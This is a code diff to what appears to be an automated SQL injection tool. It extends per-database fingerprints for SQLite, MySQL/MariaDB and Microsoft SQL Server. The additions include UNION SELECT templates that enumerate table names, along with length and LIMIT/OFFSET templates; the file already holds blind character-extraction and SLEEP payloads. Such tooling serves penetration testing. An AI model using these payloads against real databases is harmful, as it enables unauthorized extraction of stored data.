@@ -57,7 +57,13 @@ class DatabaseFingerprint:
     schema: str
     version: str
     sleep: str | None
+    length: str
     char: str | None
+    limit: str
+
+    # To check which column has the right type
+    table_name: str
+    table_name_expression: str
 
 
 fingerprints = {
@@ -65,33 +71,50 @@ fingerprints = {
         schema="sqlite_master",
         version="sqlite_version()",
         sleep=None,
+        length="LENGTH({expression})",
         char="unicode(substr({expression},{digit},1))",
+        table_name="name",
+        table_name_expression="UNION SELECT {columns} FROM sqlite_master WHERE type = 'table' LIMIT 1,2",
+        limit="LIMIT {nbr},1",
     ),
     "mysql_mariadb": DatabaseFingerprint(
         schema="information_schema",
         version="VERSION()",
         sleep="SLEEP({seconds})",  # Usage: `fingerprint.sleep.format(seconds=1)`
+        length="LENGTH({expression})",
         char="ASCII(SUBSTRING({expression},{digit},1))",
+        table_name="table_name",
+        table_name_expression="UNION SELECT {columns} FROM information_schema.tables LIMIT 1,2",
+        limit="LIMIT {nbr},1",
     ),
     "mariadb": DatabaseFingerprint(
         schema="information_schema",
         version="VERSION()",
         sleep="SLEEP({seconds})",
+        length="LENGTH({expression})",
         char="ASCII(SUBSTRING({expression},{digit},1))",
+        table_name="table_name",
+        table_name_expression="UNION SELECT {columns} FROM information_schema.tables LIMIT 1,2",
+        limit="LIMIT {nbr},1",
     ),
-    "mssql": DatabaseFingerprint(
+    "microsoft sql server": DatabaseFingerprint(
         schema="sys.tables",
         version="@@VERSION",
         sleep=None,
+        length="LEN({expression})",
         char="ASCII(SUBSTRING({expression},{digit},1))",
+        table_name="table_name",
+        table_name_expression="UNION SELECT TOP 2 {columns} FROM information_schema.tables",
+        limit="ORDER BY {element} OFFSET {{nbr}} ROWS FETCH NEXT 1 ROW ONLY",
     ),
 }
 
 
 """
-Etc
+Analysis
 """
 
+DIFFER_LENGTH_COL_TYPE = 50
 DIFFER_LENGTH_BOOL = 50
 DIFFER_LENGTH_COL_COUNT = 100
 DIFF_MARKER = "DF4456DdgZERZERAA768"
